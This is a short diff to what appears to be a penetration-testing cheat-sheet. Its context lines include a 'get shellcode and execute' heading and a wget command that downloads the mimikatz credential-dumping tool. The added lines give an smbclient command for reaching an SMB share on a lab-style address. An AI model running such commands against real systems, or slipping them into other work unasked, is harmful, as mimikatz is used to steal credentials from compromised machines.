@@ -158,3 +158,6 @@ get shellcode and execute :
 
 For mimikatz 2.1.1 :
 wget https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip
+
+Accessing share with name in space:
+smbclient \\\\10.11.1.\\Bob\ Shard
